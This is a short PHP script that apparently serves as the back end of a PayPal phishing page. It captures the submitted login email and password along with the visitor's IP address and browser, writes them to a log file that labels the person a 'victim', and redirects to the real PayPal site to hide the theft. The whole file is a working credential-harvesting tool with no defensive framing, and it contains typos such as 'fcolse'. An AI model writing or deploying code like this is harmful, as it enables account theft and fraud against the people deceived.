<?php
$date = date("Y/m/d");
$time = date("h:i:sa");
header('Location: https://www.paypal.com');
$pp_usern = $_POST['login_email'];
$pp_pass =  $_POST['login_password'] ;
$browser = $_SERVER['HTTP_USER_AGENT'];

$client_ip =  $_SERVER['HTTP_CLIENT_IP'];
$file = fopen("pp_thite_log.txt","a");
fwrite($file,"victiun ip :$client_ip \n");  
fwrite($file,"victum browse : $browser \nusername : $pp_usern \n");
fwrite($file,"password : $pp_pass \n");
fwrite($file,"login time : \n  date : $date \n  time : $time \n################################ \n");
fcolse($file);

?>
